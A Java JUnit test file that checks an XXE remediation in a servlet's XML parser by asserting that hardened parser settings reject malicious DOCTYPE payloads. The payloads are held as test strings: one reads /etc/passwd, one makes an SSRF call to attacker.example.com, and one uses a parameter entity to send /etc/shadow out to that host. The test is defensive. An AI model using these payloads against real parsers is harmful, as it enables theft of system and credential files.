package org.cysecurity.cspf.jvl.controller;

import org.junit.Test;
import org.junit.Before;
import static org.junit.Assert.*;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;

/**
 * Tests verifying that the XXE (XML External Entity) vulnerability is remediated
 * in the xxe servlet's XML parsing logic.
 *
 * CWE-611: Improper Restriction of XML External Entity Reference.
 *
 * The fix disables DTD processing and external entity resolution on the
 * DocumentBuilderFactory before any DocumentBuilder is created, which is the
 * JAXP-standard way to prevent XXE attacks.
 */
public class xxeTest {

    // -----------------------------------------------------------------------
    // Helper: build a DocumentBuilderFactory configured exactly as the fixed
    // servlet does, so tests exercise the same code path.
    // -----------------------------------------------------------------------
    private DocumentBuilderFactory createSecureFactory() throws ParserConfigurationException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Mirror the exact hardening applied in xxe.java
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        return factory;
    }

    // -----------------------------------------------------------------------
    // Positive test: well-formed XML without DTD parses successfully
    // -----------------------------------------------------------------------

    /**
     * Verify that legitimate XML (no DTD, no external entities) is still parsed
     * correctly after the security hardening — i.e., functionality is not broken.
     */
    @Test
    public void testLegitimateXmlParsesSuccessfully() throws Exception {
        String legitimateXml =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<root><child>hello</child></root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(
                legitimateXml.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        // Should parse without throwing
        org.w3c.dom.Document doc = builder.parse(is);
        assertNotNull("Parsed document must not be null", doc);
        assertEquals("Root element name should be 'root'",
                "root", doc.getDocumentElement().getLocalName());
    }

    // -----------------------------------------------------------------------
    // Security test: DOCTYPE declaration must be rejected (XXE attack vector)
    // -----------------------------------------------------------------------

    /**
     * Attack payload that uses a DOCTYPE with an external entity pointing to a
     * local file (classic XXE). The hardened factory must reject this with an
     * exception rather than resolving the entity and leaking file contents.
     *
     * The "disallow-doctype-decl" feature causes the parser to throw a
     * SAXParseException the moment it encounters any DOCTYPE declaration,
     * before any entity is resolved.
     */
    @Test
    public void testXxePayloadWithExternalFileEntityIsRejected() throws ParserConfigurationException {
        // Classic XXE payload: entity points to /etc/passwd (or any system file)
        String xxePayload =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<!DOCTYPE foo [" +
            "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">" +
            "]>" +
            "<root><child>&xxe;</child></root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder;
        try {
            builder = factory.newDocumentBuilder();
        } catch (ParserConfigurationException e) {
            fail("Factory configuration must not throw: " + e.getMessage());
            return;
        }

        InputStream stream = new ByteArrayInputStream(
                xxePayload.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            // If parsing succeeds without exception, the DTD/entity was processed — FAIL
            fail("Parser must reject XML with DOCTYPE/external entity declaration " +
                 "(XXE vulnerability not fixed)");
        } catch (SAXParseException e) {
            // Expected: the "disallow-doctype-decl" feature triggers this exception
            assertTrue(
                "SAXParseException message should indicate DOCTYPE is disallowed",
                e.getMessage() != null);
        } catch (SAXException | IOException e) {
            // Any parse-level rejection is acceptable — the exploit was blocked
        }
    }

    /**
     * Attack payload using a DOCTYPE with an external entity pointing to an
     * HTTP URL (Server-Side Request Forgery via XXE). Must also be rejected.
     */
    @Test
    public void testXxePayloadWithHttpEntityIsRejected() throws ParserConfigurationException {
        String ssrfXxePayload =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<!DOCTYPE foo [" +
            "  <!ENTITY xxe SYSTEM \"http://attacker.example.com/malicious\">" +
            "]>" +
            "<root><child>&xxe;</child></root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder;
        try {
            builder = factory.newDocumentBuilder();
        } catch (ParserConfigurationException e) {
            fail("Factory configuration must not throw: " + e.getMessage());
            return;
        }

        InputStream stream = new ByteArrayInputStream(
                ssrfXxePayload.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            fail("Parser must reject XML with DOCTYPE/external entity declaration " +
                 "(SSRF via XXE not fixed)");
        } catch (SAXParseException e) {
            assertTrue(
                "SAXParseException message should indicate DOCTYPE is disallowed",
                e.getMessage() != null);
        } catch (SAXException | IOException e) {
            // Any parse-level rejection is acceptable
        }
    }

    /**
     * Attack payload using an XML parameter entity (used to bypass simple filters).
     * Must also be rejected because the DOCTYPE itself is disallowed.
     */
    @Test
    public void testXxePayloadWithParameterEntityIsRejected() throws ParserConfigurationException {
        String paramEntityPayload =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<!DOCTYPE foo [" +
            "  <!ENTITY % file SYSTEM \"file:///etc/shadow\">" +
            "  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com/?x=%file;'>\">" +
            "  %eval; %exfil;" +
            "]>" +
            "<root><child>data</child></root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder;
        try {
            builder = factory.newDocumentBuilder();
        } catch (ParserConfigurationException e) {
            fail("Factory configuration must not throw: " + e.getMessage());
            return;
        }

        InputStream stream = new ByteArrayInputStream(
                paramEntityPayload.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            fail("Parser must reject XML with parameter entity DOCTYPE declaration");
        } catch (SAXParseException e) {
            assertTrue(
                "SAXParseException message should indicate DOCTYPE is disallowed",
                e.getMessage() != null);
        } catch (SAXException | IOException e) {
            // Any parse-level rejection is acceptable
        }
    }

    // -----------------------------------------------------------------------
    // Configuration tests: verify factory features are set correctly
    // -----------------------------------------------------------------------

    /**
     * Verify that the "disallow-doctype-decl" feature is enabled (true) on the
     * factory. This is the primary guard against XXE.
     */
    @Test
    public void testFactoryDisallowsDoctypeDecl() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertTrue(
            "Feature 'disallow-doctype-decl' must be enabled to prevent XXE",
            factory.getFeature("http://apache.org/xml/features/disallow-doctype-decl"));
    }

    /**
     * Verify that external general entity resolution is disabled.
     */
    @Test
    public void testFactoryDisablesExternalGeneralEntities() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "Feature 'external-general-entities' must be disabled to prevent XXE",
            factory.getFeature("http://xml.org/sax/features/external-general-entities"));
    }

    /**
     * Verify that external parameter entity resolution is disabled.
     */
    @Test
    public void testFactoryDisablesExternalParameterEntities() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "Feature 'external-parameter-entities' must be disabled to prevent XXE",
            factory.getFeature("http://xml.org/sax/features/external-parameter-entities"));
    }

    /**
     * Verify that loading of external DTDs is disabled.
     */
    @Test
    public void testFactoryDisablesLoadExternalDtd() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "Feature 'load-external-dtd' must be disabled to prevent XXE",
            factory.getFeature(
                "http://apache.org/xml/features/nonvalidating/load-external-dtd"));
    }

    /**
     * Verify that XInclude processing is disabled.
     */
    @Test
    public void testFactoryDisablesXInclude() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "XInclude must be disabled to prevent external resource inclusion",
            factory.isXIncludeAware());
    }

    /**
     * Verify that entity reference expansion is disabled.
     */
    @Test
    public void testFactoryDisablesExpandEntityReferences() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "Entity reference expansion must be disabled to prevent XXE",
            factory.isExpandEntityReferences());
    }
}
